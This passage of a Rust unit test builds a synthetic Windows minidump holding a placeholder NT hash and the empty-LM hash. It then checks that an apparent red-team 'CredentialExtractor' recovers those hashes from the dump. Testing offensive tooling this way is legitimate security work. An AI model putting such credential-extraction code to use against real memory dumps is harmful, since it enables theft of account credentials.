            0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
        ];
        let lm_hash: [u8; 16] = [
            0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
            0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
        ];

        // Region: 256 bytes, NT hash at offset 0, LM hash at offset 16.
        let mut region = vec![0u8; 256];
        region[0..16].copy_from_slice(&nt_hash);
        region[16..32].copy_from_slice(&lm_hash);

        let region_va: u64 = 0x0000_7fff_0000_0000_u64;
        let region_size: u64 = region.len() as u64;

        // Memory64List starts at offset 64.
        // BaseRva points to where region data starts in the file.
        // Region data will start right after the header+dir+mem64list.
        // Header = 32 bytes (we'll use first 32), dir at 32 (12 bytes),
        // mem64list at 64 (16 + 1*16 = 32 bytes), region at 96.
        let base_rva: u64 = 96;

        let mut dump = vec![0u8; 96 + region.len()];

        // Header (32 bytes):
        //   sig(4) version(4) stream_count(4) dir_rva(4) + padding(16)
        let sig = 0x504d_444d_u32.to_le_bytes();
        dump[0..4].copy_from_slice(&sig);
        let ver = 0x0000_a793_u32.to_le_bytes();
        dump[4..8].copy_from_slice(&ver);
        let stream_count = 1u32.to_le_bytes();
        dump[8..12].copy_from_slice(&stream_count);
        let dir_rva_val = 32u32.to_le_bytes();
        dump[12..16].copy_from_slice(&dir_rva_val);

        // Directory at offset 32 (12 bytes):
        //   StreamType=9(4) + DataSize=32(4) + StreamRva=64(4)
        dump[32..36].copy_from_slice(&9u32.to_le_bytes());   // Memory64ListStream
        dump[36..40].copy_from_slice(&32u32.to_le_bytes());  // DataSize
        dump[40..44].copy_from_slice(&64u32.to_le_bytes());  // StreamRva

        // Memory64List at offset 64 (32 bytes):
        //   NumberOfRanges=1(8) + BaseRva=96(8) + [VA(8)+Size(8)]
        dump[64..72].copy_from_slice(&1u64.to_le_bytes());          // range count
        dump[72..80].copy_from_slice(&base_rva.to_le_bytes());      // base RVA
        dump[80..88].copy_from_slice(&region_va.to_le_bytes());     // start VA
        dump[88..96].copy_from_slice(&region_size.to_le_bytes());   // size

        // Region data at offset 96.
        dump[96..96 + region.len()].copy_from_slice(&region);

        // Write to a temp file and parse.
        use std::io::Write;
        let mut tmp = std::env::temp_dir();
        tmp.push("forge_test_synthetic.dmp");
        {
            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
            f.write_all(&dump).expect("Write dump");
        }
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(), None, true, false,
        )
        .expect("Valid CredentialExtractor");
        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
        let _ = std::fs::remove_file(&tmp);

        assert!(result.is_ok(), "Synthetic dump must parse: {:?}", result);
        let creds = result.unwrap();
        assert_eq!(creds.len(), 1, "Expected exactly 1 credential");
        let c = &creds[0];
        assert_eq!(c.get("nt_hash").map(String::as_str),
            Some("0123456789abcdef0123456789abcdef"),
            "NT hash must match");
        assert_eq!(c.get("lm_hash").map(String::as_str),
            Some("aad3b435b51404eeaad3b435b51404ee"),
            "LM hash must be empty-LM sentinel");
        assert_eq!(c.get("empty_password").map(String::as_str), Some("false"),
            "Not the empty-NT hash");
    }
}
